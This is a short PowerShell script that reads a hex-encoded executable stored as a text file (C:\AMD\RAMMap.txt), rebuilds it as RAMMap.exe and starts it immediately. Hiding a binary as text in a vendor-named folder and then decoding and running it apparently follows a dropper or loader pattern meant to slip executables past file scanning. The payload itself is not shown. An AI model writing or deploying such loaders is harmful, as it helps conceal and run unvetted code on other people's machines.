# Function to convert HEX back to EXE
function Convert-HexToExe {
    param (
        [string]$hexFilePath,
        [string]$outputExeFile
    )

    try {
        # Read the hexadecimal string from the input file
        $hexString = Get-Content $hexFilePath -Raw

        # Split the hex string into byte pairs (each 2 characters = 1 byte)
        $byteArray = for ($i = 0; $i -lt $hexString.Length; $i += 2) {
            [Convert]::ToByte($hexString.Substring($i, 2), 16)
        }

        # Write the byte array to the output .exe file
        [System.IO.File]::WriteAllBytes($outputExeFile, $byteArray)

        Write-Host "Decoding successful! Output saved to $outputExeFile"

        # Start the executable
        Start-Process -FilePath $outputExeFile
        Write-Host "$outputExeFile has been started."
    } catch {
        Write-Host "Error: $($_.Exception.Message)"
    }
}

# Specify the paths for HEX to EXE conversion
$hexFilePath = 'C:\AMD\RAMMap.txt'
$outputExeFile = 'C:\AMD\RAMMap.exe'

# Call the function to perform the conversion and run the EXE
Convert-HexToExe -hexFilePath $hexFilePath -outputExeFile $outputExeFile
